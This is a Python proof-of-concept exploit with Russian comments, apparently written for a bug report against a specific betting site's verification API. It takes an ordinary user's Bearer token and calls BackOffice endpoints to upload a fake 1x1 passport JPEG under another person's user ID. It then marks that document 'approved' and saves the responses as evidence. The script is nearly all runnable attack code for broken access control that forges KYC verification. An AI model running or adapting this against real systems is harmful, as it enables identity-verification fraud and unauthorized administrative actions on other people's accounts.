# bug3_poc.py
import requests
import json

BASE = "https://1xlite-03801.world"

# вставь свой обычный Bearer токен из DevTools
MY_TOKEN = input("вставь свой user Bearer token: ").strip()
# вставь чужой userId (или свой второй аккаунт)
TARGET_USER_ID = input("вставь userId для KYC (можно свой второй аккаунт): ").strip()

headers_auth = {
    "Authorization": f"Bearer {MY_TOKEN}",
    "Origin": BASE,
    "User-Agent": "Mozilla/5.0"
}

# создаем тестовый jpeg файл минимального размера
import io
# минимальный валидный jpeg (1x1 пиксель)
JPEG_BYTES = bytes([
    0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,
    0x01,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0xFF,0xDB,0x00,0x43,
    0x00,0x08,0x06,0x06,0x07,0x06,0x05,0x08,0x07,0x07,0x07,0x09,
    0x09,0x08,0x0A,0x0C,0x14,0x0D,0x0C,0x0B,0x0B,0x0C,0x19,0x12,
    0x13,0x0F,0x14,0x1D,0x1A,0x1F,0x1E,0x1D,0x1A,0x1C,0x1C,0x20,
    0x24,0x2E,0x27,0x20,0x22,0x2C,0x23,0x1C,0x1C,0x28,0x37,0x29,
    0x2C,0x30,0x31,0x34,0x34,0x34,0x1F,0x27,0x39,0x3D,0x38,0x32,
    0x3C,0x2E,0x33,0x34,0x32,0xFF,0xC0,0x00,0x0B,0x08,0x00,0x01,
    0x00,0x01,0x01,0x01,0x11,0x00,0xFF,0xC4,0x00,0x1F,0x00,0x00,
    0x01,0x05,0x01,0x01,0x01,0x01,0x01,0x01,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
    0x09,0x0A,0x0B,0xFF,0xC4,0x00,0xB5,0x10,0x00,0x02,0x01,0x03,
    0x03,0x02,0x04,0x03,0x05,0x05,0x04,0x04,0x00,0x00,0x01,0x7D,
    0xFF,0xDA,0x00,0x08,0x01,0x01,0x00,0x00,0x3F,0x00,0xFB,0xD2,
    0x8A,0x28,0x03,0xFF,0xD9
])

print(f"\nшаг 1: загрузка документа через обычный user token на чужой userId={TARGET_USER_ID}")
files = {
    "document": ("passport.jpg", io.BytesIO(JPEG_BYTES), "image/jpeg")
}
data = {
    "user_id": TARGET_USER_ID,
    "document_type": "passport"
}

upload_r = requests.post(
    BASE + "/verification-api/api/v1/BackOffice/documents/upload",
    headers=headers_auth,
    files=files,
    data=data
)
print(f"статус загрузки: {upload_r.status_code}")
print(f"ответ: {upload_r.text[:300]}")

if upload_r.status_code == 200:
    try:
        upload_data = upload_r.json()
        document_id = upload_data.get("documentId") or upload_data.get("id")
        print(f"\n=== КРИТИЧНО: BackOffice принял обычный user token! ===")
        print(f"documentId: {document_id}")

        if document_id:
            print(f"\nшаг 2: верификация документа userId={TARGET_USER_ID}")
            verify_headers = {**headers_auth, "Content-Type": "application/json"}
            verify_body = {
                "documentId": document_id,
                "status": "approved",
                "userId": int(TARGET_USER_ID)
            }
            verify_r = requests.post(
                BASE + "/verification-api/api/v1/BackOffice/documents/verify",
                json=verify_body,
                headers=verify_headers
            )
            print(f"статус верификации: {verify_r.status_code}")
            print(f"ответ: {verify_r.text[:300]}")

            with open("bug3_evidence.json", "w") as f:
                json.dump({
                    "token_type": "regular_user_token",
                    "target_userId": TARGET_USER_ID,
                    "upload_status": upload_r.status_code,
                    "upload_response": upload_data,
                    "documentId": document_id,
                    "verify_status": verify_r.status_code,
                    "verify_response": verify_r.text
                }, f, indent=2)
            print("\nсохранено в bug3_evidence.json")
    except Exception as e:
        print(f"ошибка парсинга: {e}")
        print("raw:", upload_r.text)
else:
    print("эндпоинт вернул ошибку - возможно исправили или нужен другой формат запроса")
